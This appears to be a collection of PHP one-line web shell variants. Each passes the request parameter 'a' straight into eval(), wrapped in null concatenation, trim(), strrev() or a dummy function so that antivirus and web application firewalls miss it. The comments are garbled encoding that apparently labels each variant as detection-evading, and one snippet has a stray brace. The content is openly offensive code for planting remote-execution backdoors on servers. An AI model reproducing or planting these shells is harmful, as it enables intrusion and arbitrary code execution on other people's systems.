<?php
$a = $_REQUEST['a'];
$c = null;
$b = null;
eval($c.$b.$a);
?> //��ɱ
<?php
$a = $_REQUEST['a'];
$c = null;
eval(trim($b.$a));
?> 
//��ɱ

<?php
$a = $_REQUEST['a'];
$c = null;
eval($c.$c.$a);
?> //��ɱ

<?php
$a = $_REQUEST['a'];
$c = null;
eval(''.$c.$a);        
}
?>//��ɱ

<?php
$a = $_REQUEST['a'];
$c = null;
eval($c.strrev($a));
?> // �����Ե����waf

<?php
$a = $_REQUEST['a'];
eval(ha().$a);        

function ha(){
        return null;
}
?>//��ɱ

<?php
$a = $_REQUEST['a'];
eval(ha().$a);        

function ha(){
        return '';
}
?>//��ɱ